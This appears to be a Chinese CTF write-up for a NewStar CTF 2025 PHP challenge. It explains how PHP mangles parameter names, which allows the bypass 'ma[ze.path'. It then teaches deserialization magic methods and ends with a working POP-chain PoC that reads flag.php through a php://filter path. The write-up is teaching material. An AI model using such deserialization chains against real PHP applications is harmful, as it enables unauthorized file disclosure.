---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# 小羊走迷宫

本题考点：非法变量名传参，PHP 反序列化

## 非法变量名传参

首先我们看到源码的传参部分内容

```php
if ($_GET["ma_ze.path"]){
    unserialize(base64_decode($_GET["ma_ze.path"]));
}else{
    echo "这个变量名有点奇怪，要怎么传参呢？";
}
```

如果我们直接尝试传入 `?ma_ze.path=123` 会发现实际上没有反应

这是因为 PHP 会将变量名中的点和空格等字符解析为下划线

[https://www.php.net/manual/zh/language.variables.external.php](https://www.php.net/manual/zh/language.variables.external.php)

![image](/assets/images/wp/2025/week4/lamb-maze_1.png)

![image](/assets/images/wp/2025/week4/lamb-maze_2.png)

同样的，`[` 也是一个会被转换为 `_` 的符号

但是在 PHP 版本小于 8 时，中括号 `[` 被转换成下划线 `_` 的行为会导致转换错误，使得接下来如果该参数名中还有 `非法字符` 并不会继续转换成下划线 `_`

![image](/assets/images/wp/2025/week4/lamb-maze_3.png)

可以看见在 [php8 对这个 bug 修复的 commit](https://github.com/php/php-src/commit//fc4d462e947828fdbeac6020ac8f34704a218834?branch=fc4d462e947828fdbeac6020ac8f34704a218834&diff=unified) 中，原来的逻辑是只对 `[` 进行了一次替换，因此导致了这个问题

所以这里我们只需要传入 `ma[ze.path=123` 即可绕过

![image](/assets/images/wp/2025/week4/lamb-maze_4.png)

## 反序列化

下面在对反序列化部分进行分析之前，我们先来了解一下 PHP 反序列化

### PHP 反序列化基础

**序列化（Serialization）** 是指将数据结构或对象的状态转换为可以存储（如保存到文件、数据库）或传输（如通过网络发送）的格式的过程。反序列化则是这个过程的逆过程。

在 php 中，序列化和反序列化分别通过 `serialize()` 函数和 `unserialize()` 函数进行

`serialize()` 函数会将传入的对象转化成特定格式的字符串，不同类型的属性的序列化格式大致如下

```php
<?php
$interger = 1; # 整数
echo serialize($interger) . PHP_EOL;
# i:1;

$float = 1.4; # 浮点数
echo serialize($float) . PHP_EOL;
# d:1.4;

$string = "Ciallo~"; # 字符串
echo serialize($string) . PHP_EOL;
# s:7:"Ciallo~";

$bool = true; # 布尔值
echo serialize($bool) . PHP_EOL;
# b:1;

$null = null; # NULL
echo serialize($null) . PHP_EOL;
# N;

$list = [$interger, $float, $string, $bool]; #列表
echo serialize($list) . PHP_EOL;
# a:4:{i:0;i:1;i:1;d:1.4;i:2;s:7:"Ciallo~";i:3;b:1;}

class test
{
    public $whoami = "xnftrone";
}
$object = new test(); # 类对象
echo serialize($object) . PHP_EOL;
# O:4:"test":1:{s:6:"whoami";s:8:"xnftrone";}
```

值得一提的是，类对象的方法不会被序列化，`private` 属性和 `protected` 属性则会被特殊编码

`unserialize()` 函数则可以将传入的序列化字符串转换回对象

```php
<?php
class test
{
    public $whoami = "xnftrone";
}
$object = new test(); # 对象
echo serialize($object) . PHP_EOL;
# O:4:"test":1:{s:6:"whoami";s:8:"xnftrone";}

$ser = serialize($object);
var_dump(unserialize($ser));
/*
object(test)#2 (1) {
  ["whoami"]=>
  string(8) "xnftrone"
}
*/
```

### 魔术方法

PHP 为类设计了一系列的特殊方法，这些方法不需要被显式调用，而是在特殊事件发生时自动触发

它们一般是由 `__` 双下划线开头的

```plaintext
__construct()          //对象创建(new)时会自动调用。
__wakeup()             //使用unserialize时触发
__sleep()              //使用serialize时触发
__destruct()           //对象被销毁时触发
__call()               //在对象上下文中调用不可访问的方法时触发
__callStatic()         //在静态上下文中调用不可访问的方法时触发
__get()                //用于从不可访问的属性读取数据 包括private或者是不存在的
__set()                //用于将数据写入不可访问的属性
__isset()              //在不可访问的属性上调用isset()或empty()触发
__unset()              //在不可访问的属性上使用unset()时触发
__toString()           //把类当作字符串使用时触发
__invoke()             //当脚本尝试将对象调用为函数时触发  就是加了括号
__autoload()           //在代码中当调用不存在的类时会自动调用该方法。
```

所谓 pop 链，就是通过特殊的变量设计，使得魔术方法链式调用

举个简单的例子

```php
<?php
class test1
{
    public $whoami = "xnftrone";
    function __wakeup()
    {
        echo "I'm " . $this->whoami . PHP_EOL;
    }
}
class test2
{
    function __toString()
    {
        echo "You get the flag!";
        return "hacker";
    }
}

$test2 = new test2();
$test1 = new test1();

$test1->whoami = $test2;
$ser = serialize($test1);

unserialize($ser);

# 输出
# You get the flag!I'm hacker
```

在这个例子中，我们将 `$test1` 的 `$whoami` 属性设置为了 `$test2`

随后我们通过 `unserialize($ser)` 触发了 `test1` 类的 `__wakeup()` 方法

在 `__wakeup()` 方法中，我们对 `$whoami` 变量进行了 `echo` 操作，如果 `$whoami` 是一个具有 `__toString()` 方法的类对象，那么这个方法会被调用，因此我们得到了以上结果

在这个例子中，pop 链是这样的：

```php
test1.__wakeup -> test2.__toString
```

在实际做题过程中，我们可以从漏洞点开始一步一步往回找到反序列化触发点

### 解决问题

经过以上铺垫，我们可以开始尝试这道题目了

```php
<?php
include "flag.php";
error_reporting(0);
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();
    }
}
class Treasure{
    protected $door;
    protected $chest;
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;
    }
}
class SaySomething{
    public $sth;
    function __invoke()
    {
        echo "说点什么呢 ";
        return "说： ".$this->sth;
    }
}
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧"."<br>";
        echo file_get_contents($this->path);
    }
}
```

首先我们从 `include "flag.php";` 可以推测 flag 在 `flag.php` 中，因此我们可以很快注意到一个文件包含的函数

```php
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧"."<br>";
        echo file_get_contents($this->path);
    }
}
```

这就是我们的漏洞点，只需要使用 PHP filter 伪协议读取文件即可

> 当然文件包含还有其它的利用方式，感兴趣的 newstars 可以自行检索学习

想要调用 `__call()` 方法，我们需要调用这个类不可访问，或者是不存在的方法

```php
class Treasure{
    protected $door;
    protected $chest;
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;
    }
}
```

也就是这里的 `$door` 的值需要是上面的 `endPoint` 类对象

同理我们需要一个不可访问属性读取来触发 `__get`，直接使用同一个类的 `__toString()` 就可以做到

```php
class SaySomething{
    public $sth;
    function __invoke()
    {
        echo "说点什么呢 ";
        return "说： ".$this->sth;
    }
}
```

利用 `.` 进行字符串拼接也会触发 `__toString()`

```php
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();
    }
}
```

最后在这里触发 `__invoke()`，同时这里也是反序列化的起点

> 如果你恰好卡在了 pop 链分析的某一步，走出旁边的小迷宫也能给到一些提示哦

![hint](/assets/images/wp/2025/week4/lamb-maze_5.png)

最终的 pop 链如下

```php
startPoint.__wakeup -> SaySomething.__invoke -> Treasure.__toString ->
Treasure.__get -> endPoint.__call
```

PoC 如下：

> 对于 `protected` 和 `private` 属性的一些参数在本题中没有影响，因此直接改为 public 即可
> 当然你也可以选择使用反射来进行赋值

```php
<?php
class startPoint{
    public $direction;
}
class Treasure{
    public $door;
    public $chest;
}
class SaySomething{
    public $sth;
}
class endPoint{
    private $path="php://filter/convert.base64-encode/resource=flag.php";
}

$startPoint = new startPoint();
$say = new SaySomething();
$startPoint -> direction = $say;

$tr = new Treasure();
$say -> sth = $tr;

$tr2 = new Treasure();
$tr -> chest = $tr2;
$tr2 -> door = new endPoint();

/*
endPoint.__call <-
Treasure.__get <-
Treasure.__toString <-
SaySomething.__invoke <-
startPoint.__wakeup
 */

echo serialize($startPoint)."<br>\n";
echo urlencode(serialize($startPoint))."<br>\n";
echo base64_encode(serialize($startPoint))."<br>\n";
```

![image](/assets/images/wp/2025/week4/lamb-maze_6.png)
